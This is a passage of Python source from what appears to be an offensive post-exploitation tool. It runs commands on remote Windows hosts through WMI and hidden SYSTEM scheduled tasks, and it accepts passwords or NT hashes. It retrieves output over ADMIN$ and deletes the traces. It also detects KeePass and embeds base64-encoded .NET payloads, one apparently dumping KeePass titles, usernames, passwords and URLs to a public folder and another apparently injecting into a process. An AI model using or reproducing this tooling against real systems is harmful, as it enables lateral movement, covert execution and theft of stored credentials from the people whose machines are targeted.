        if data[off:off+4] == b'MEOW':
            flags = struct.unpack('<I', data[off+4:off+8])[0]
            if flags & 1:
                std_off = off + 24
                if std_off + 40 <= len(data):
                    ipid = data[std_off+8:std_off+24]
                    break
    return port, ipid

def wmi_exec(target, domain, user, password, command, smb_ver="auto", nt_hash=None, smb_port=445, timeout=15):
    tf = "".join(random.choices(string.ascii_letters, k=8)) + ".tmp"
    full_cmd = f'cmd.exe /c {command} > C:\\Windows\\Temp\\{tf} 2>&1'
    rpc = DCERPCRaw(target, 135, timeout)
    rpc.connect()
    ntlm_epm = NTLMContext(domain, user, password, use_mic=True, nt_hash=nt_hash)
    challenge_epm = rpc.bind(_IID_IREMACT2, (0, 0), ntlm_epm, auth_level=5)
    rpc.auth3(ntlm_epm, challenge_epm)
    stub = _orpcthis()
    stub += _CLSID_WBEM_LOGIN
    stub += struct.pack('<I', 0)
    stub += struct.pack('<I', 0)
    stub += struct.pack('<I', 2)
    stub += struct.pack('<I', 0)
    stub += struct.pack('<I', 1)
    stub += struct.pack('<I', 0x00020000)
    stub += struct.pack('<I', 1) + _IID_WBEM_LOGIN
    stub += struct.pack('<HH', 1, 0)
    stub += struct.pack('<I', 1) + struct.pack('<H', 7)
    resp = rpc.request_auth(0, stub, ntlm_epm)
    port, ipid = _parse_remote_activation_resp(resp)
    if not port:
        raise ValueError("could not find dynamic port in RemoteActivation response")
    rpc.disconnect()
    rpc2 = DCERPCRaw(target, port, timeout)
    rpc2.connect()
    ntlm = NTLMContext(domain, user, password, use_mic=True, nt_hash=nt_hash)
    challenge = rpc2.bind(_IID_IREMUNK2_REAL, (0,0), ntlm)
    rpc2.auth3(ntlm, challenge)
    ns = "//./root/cimv2"
    ns_enc = (ns + '\x00').encode('utf-16-le')
    ns_chars = len(ns) + 1
    login_stub = _orpcthis()
    login_stub += struct.pack('<I', 0x00020000)
    login_stub += struct.pack('<III', ns_chars, 0, ns_chars) + ns_enc
    if len(ns_enc) % 4:
        login_stub += b'\x00' * (4 - len(ns_enc) % 4)
    login_stub += struct.pack('<I', 0) * 4
    resp2 = rpc2.request_auth(6, login_stub, ntlm, obj_uuid=ipid)
    svc_port, svc_ipid = _parse_remote_activation_resp(resp2)
    cmd_enc = (full_cmd + '\x00').encode('utf-16-le')
    cmd_chars = len(full_cmd) + 1
    method_stub = _orpcthis()
    cls_name = "Win32_Process"
    cls_enc = (cls_name + '\x00').encode('utf-16-le')
    cls_chars = len(cls_name) + 1
    method_stub += struct.pack('<I', 0x00020000)
    method_stub += struct.pack('<III', cls_chars, 0, cls_chars) + cls_enc
    if len(cls_enc) % 4:
        method_stub += b'\x00' * (4 - len(cls_enc) % 4)
    meth_name = "Create"
    meth_enc = (meth_name + '\x00').encode('utf-16-le')
    meth_chars = len(meth_name) + 1
    method_stub += struct.pack('<I', 0x00020004)
    method_stub += struct.pack('<III', meth_chars, 0, meth_chars) + meth_enc
    if len(meth_enc) % 4:
        method_stub += b'\x00' * (4 - len(meth_enc) % 4)
    method_stub += struct.pack('<I', 0)
    method_stub += struct.pack('<I', 0x00020008)
    method_stub += struct.pack('<III', cmd_chars, 0, cmd_chars) + cmd_enc
    if len(cmd_enc) % 4:
        method_stub += b'\x00' * (4 - len(cmd_enc) % 4)
    target_ipid = svc_ipid if svc_ipid else ipid
    rpc2.request_auth(24, method_stub, ntlm, obj_uuid=target_ipid)
    rpc2.disconnect()
    time.sleep(3)
    output = ""
    try:
        smb = _smb_session(target, domain, user, password, smb_ver, nt_hash, smb_port, timeout)
        smb.tree_connect("ADMIN$")
        for attempt in range(5):
            try:
                fid2 = smb.create(f"Temp\\{tf}", 0x80|0x01, 1, 1, 0x40)
                data = b''
                off = 0
                while True:
                    try:
                        chunk = smb.read(fid2, 65536, off)
                        if not chunk: break
                        data += chunk
                        off += len(chunk)
                    except: break
                output = data.decode('utf-8', errors='replace')
                smb.close(fid2)
                try:
                    fid3 = smb.create(f"Temp\\{tf}", 0x10080, 7, 1, 0x1040)
                    smb.close(fid3)
                except: pass
                break
            except:
                time.sleep(1)
        smb.logoff()
        smb.disconnect()
    except: pass
    return output

def _remote_exec(target, domain, user, password, command, method="tsch", smb_ver="auto", nt_hash=None, port=445, timeout=15, winrm_port=5985):
    if method == "svcctl":
        return svcctl_exec(target, domain, user, password, command, smb_ver, nt_hash, port, timeout)
    elif method == "winrm":
        return winrm_exec(target, domain, user, password, command, nt_hash, winrm_port, timeout)
    elif method == "wmi":
        return wmi_exec(target, domain, user, password, command, smb_ver, nt_hash, port, timeout)
    else:
        smb = _smb_session(target, domain, user, password, smb_ver, nt_hash, port, timeout)
        try:
            smb.tree_connect("IPC$")
            fid = smb.create("atsvc", 0x0012019F, 7, 1, 0x40)
            dce = DCERPC(smb, smb.tid, fid)
            ntlm_rpc = NTLMContext(domain, user, password, use_mic=True, nt_hash=nt_hash)
            dce.bind(ntlm_rpc)
            tn = "".join(random.choices(string.ascii_letters, k=8))
            tf = tn + ".tmp"
            xml = (
                '<?xml version="1.0" encoding="UTF-16"?>'
                '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                '<Triggers><CalendarTrigger><StartBoundary>2015-07-15T20:35:13</StartBoundary>'
                '<Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</DaysInterval>'
                '</ScheduleByDay></CalendarTrigger></Triggers>'
                '<Principals><Principal id="LocalSystem"><UserId>S-1-5-18</UserId>'
                '<RunLevel>HighestAvailable</RunLevel></Principal></Principals>'
                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
                '<AllowHardTerminate>true</AllowHardTerminate>'
                '<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>'
                '<IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd>'
                '<RestartOnIdle>false</RestartOnIdle></IdleSettings>'
                '<AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled>'
                '<Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>'
                '<WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit>'
                '<Priority>7</Priority></Settings>'
                '<Actions Context="LocalSystem"><Exec>'
                '<Command>cmd.exe</Command>'
                '<Arguments>/C ' + xml_escape(command) + ' &gt; %windir%\\Temp\\' + tf + ' 2&gt;&amp;1</Arguments>'
                '</Exec></Actions></Task>'
            )
            tp = "\\" + tn
            dce.request(1, tsch_register(tp, xml))
            dce.request(12, tsch_run(tp))
            for _ in range(30):
                resp = dce.request(16, tsch_last_run(tp))
                yr = struct.unpack('<H', resp[0:2])[0] if len(resp) >= 2 else 0
                if yr != 0: break
                time.sleep(1)
            try: dce.request(13, tsch_delete(tp))
            except: pass
            smb.close(fid)
            output = ""
            try:
                smb.tree_connect("ADMIN$")
                for attempt in range(5):
                    try:
                        fid2 = smb.create(f"Temp\\{tf}", 0x80|0x01, 1, 1, 0x40)
                        data = b''
                        off = 0
                        while True:
                            try:
                                chunk = smb.read(fid2, 65536, off)
                                if not chunk: break
                                data += chunk
                                off += len(chunk)
                            except: break
                        output = data.decode('utf-8', errors='replace')
                        smb.close(fid2)
                        try:
                            fid3 = smb.create(f"Temp\\{tf}", 0x10080, 7, 1, 0x1040)
                            smb.close(fid3)
                        except: pass
                        break
                    except:
                        time.sleep(1)
            except: pass
        finally:
            try: smb.logoff()
            except: pass
            smb.disconnect()
        return output

def check_keepass(target, domain, user, password, method="tsch", smb_ver="auto", nt_hash=None, port=445, timeout=15, winrm_port=5985):
    out = _remote_exec(target, domain, user, password,
                       'tasklist /fi "imagename eq KeePass.exe"', method, smb_ver, nt_hash, port, timeout, winrm_port)
    if "KeePass.exe" in out:
        for line in out.split("\n"):
            if "KeePass.exe" in line:
                for p in line.split():
                    if p.isdigit():
                        return int(p)
    return None

KPX_B64 = (
    "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"
    "AIEAPQAGAKMAHwAGALwAPQAGAMkAPQAGAN8AHwAGAOYA8wAGAAMBDwEGACIBDwEGAEgBHwAGAGAB"
    "8wAGAH4BHwAGAJIBHwAGAJwB8wAGALwBPQAGANkBHwAGAPUBPQAGAPwBPQAGAA4CPQAGADYCVAIA"
    "AAAAAQAAAAAAAQABAAEAEAAOAAoAIQABAAEAUCAAAAAAhhj9AGMAAQBYIAAAAACWACgCowABAJwj"
    "AAAAAJEALALJAAIAAAABABAAAAABAK4BAAACALQBAAADALcBCQAmAAEAGQBZAAYAGQBrAAsAEQB5"
    "ABEAIQCOABYACQCXABoAEQCXACAAEQCoACgAKQCXAC4AKQCwADYAMQDWAD4AQQCoAEMASQD9AEgA"
    "UQAuAU0AWQA8AVIAKQCwAFYAQQBQARYACQBZAVwAaQBrAUgAaQBrAWMAWQB1AWcAcQCKAWMACQBZ"
    "AWsAgQChAXEAKQDHAXcAKQDrAX4AiQCXAI4AqQAZApYACQAgAp0AQQD9AGMAsQD9AGMALgD7AO4A"
    "qADRAASAAAAAAAAAAAAAAAAAAAAAAAoAAAAEAAAAAAAAAAAAAAANAXQCAAAAAAAAADxNb2R1bGU+"
    "AEtQWABFAG91dFBhdGgAU3RyaW5nAFN5c3RlbQBJc051bGxPckVtcHR5AEFzc2VtYmx5AFN5c3Rl"
    "bS5SZWZsZWN0aW9uAEFwcERvbWFpbgBnZXRfQ3VycmVudERvbWFpbgBHZXRBc3NlbWJsaWVzAEdl"
    "dE5hbWUAQXNzZW1ibHlOYW1lAGdldF9OYW1lAG9wX0VxdWFsaXR5AFR5cGUAR2V0VHlwZQBHZXRQ"
    "cm9wZXJ0eQBQcm9wZXJ0eUluZm8AQmluZGluZ0ZsYWdzAEdldFZhbHVlAE9iamVjdABTdHJlYW1X"
    "cml0ZXIAU3lzdGVtLklPAC5jdG9yAElFbnVtZXJhYmxlAFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51"
    "bWVyYXRvcgBHZXRFbnVtZXJhdG9yAGdldF9DdXJyZW50AEJvb2xlYW4AVG9TdHJpbmcAQ29uY2F0"
    "AFRleHRXcml0ZXIAV3JpdGVMaW5lAE1vdmVOZXh0AElEaXNwb3NhYmxlAERpc3Bvc2UARXhjZXB0"
    "aW9uAEZpbGUAV3JpdGVBbGxUZXh0AGdyb3VwAHN3AHBhdGgATWV0aG9kSW5mbwBHZXRUeXBlRnJv"
    "bUhhbmRsZQBSdW50aW1lVHlwZUhhbmRsZQBHZXRNZXRob2QAQmluZGVyAFBhcmFtZXRlck1vZGlm"
    "aWVyAE1ldGhvZEJhc2UASW52b2tlAFJlcGxhY2UAUnVuAER1bXBHcm91cABSdW50aW1lQ29tcGF0"
    "aWJpbGl0eUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAG1zY29ybGli"
    "AEtQWC5kbGwAAAAAAENDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEQAbwBjAHUAbQBl"
    "AG4AdABzAFwAawBwAHgALgB0AHgAdAAAD0sAZQBlAFAAYQBzAHMAAB9LAGUAZQBQAGEAcwBzAC4A"
    "UAByAG8AZwByAGEAbQAAEU0AYQBpAG4ARgBvAHIAbQAAH0QAbwBjAHUAbQBlAG4AdABNAGEAbgBh"
    "AGcAZQByAAATRABvAGMAdQBtAGUAbgB0AHMAABFEAGEAdABhAGIAYQBzAGUAAA1JAHMATwBwAGUA"
    "bgAAIUkATwBDAG8AbgBuAGUAYwB0AGkAbwBuAEkAbgBmAG8AAAlQAGEAdABoAAAPdQBuAGsAbgBv"
    "AHcAbgAAHT0APQA9ACAARABBAFQAQQBCAEEAUwBFADoAIAAACSAAPQA9AD0AABNSAG8AbwB0AEcA"
    "cgBvAHUAcAAAAQAJLgBlAHIAcgAACU4AYQBtAGUAAAMvAAAPRQBuAHQAcgBpAGUAcwAAD1MAdABy"
    "AGkAbgBnAHMAABFSAGUAYQBkAFMAYQBmAGUAAAtUAGkAdABsAGUAABFVAHMAZQByAE4AYQBtAGUA"
    "ABFQAGEAcwBzAHcAbwByAGQAAAdVAFIATAAAC04AbwB0AGUAcwAAA1sAAANdAAAPVABpAHQAbABl"
    "ADoAIAAADVUAcwBlAHIAOgAgAAANUABhAHMAcwA6ACAAAAtVAFIATAA6ACAAAA9OAG8AdABlAHMA"
    "OgAgAAAFDQAKAAAHIAB8ACAAAAMKAAANRwByAG8AdQBwAHMAAAB1CZcSNC1oQJGRJ+Lv2KL9AAQA"
    "AQIOBAAAEg0FIAAdEgkEIAASEQMgAA4FAAICDg4HAAICEgkSCQUgARIVDgcAAgISFRIVByACEhkO"
    "ER0EIAEcHAQgABIVBCABAQ4EIAASLQMgABwFIAESGQ4GAAMODg4OAyAAAQMgAAIFAAIODg4FAAIB"
    "Dg4GAAESFRFJDyAFEkUOER0STR0SFR0RUQcAAgISRRJFBiACHBwdHAUgAg4ODgQAAQgOIAcUEgkS"
    "CR0SCQgIEhUcHBwSJRIpHBItHBwcDhwSORI9BwADARwSJQ4cBxMODhwSKRwSLRwSRQ4ODg4OEjkc"
    "EikcEi0SOR4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIt3pcVhk04IkAAAAAAAAAAAAA"
    "+C8AAAAAAAAAAAAADjAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAABfQ29yRGxs"
    "TWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAA"
    "AEgAAABYQAAAeAIAAAAAAAAAAAAAeAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8A"
    "AAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABE"
    "AAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8A"
    "bgAAAAAAfwCwBNgBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAALQBAAABADAAMAA3"
    "AGYAMAA0AGIAMAAAABwAAgABAEMAbwBtAG0AZQBuAHQAcwAAACAAAAAkAAIAAQBDAG8AbQBwAGEA"
    "bgB5AE4AYQBtAGUAAAAAACAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAA"
    "AAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAACgA"
    "BAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAASwBQAFgAAAAoAAIAAQBMAGUAZwBhAGwAQwBv"
    "AHAAeQByAGkAZwBoAHQAAAAgAAAALAACAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMA"
    "AAAAACAAAAA4AAgAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAASwBQAFgALgBk"
    "AGwAbAAAACQAAgABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAIAAAACgAAgABAFAAcgBvAGQA"
    "dQBjAHQAVgBlAHIAcwBpAG8AbgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAAAgMAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
)
INJ_B64 = (
    "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"
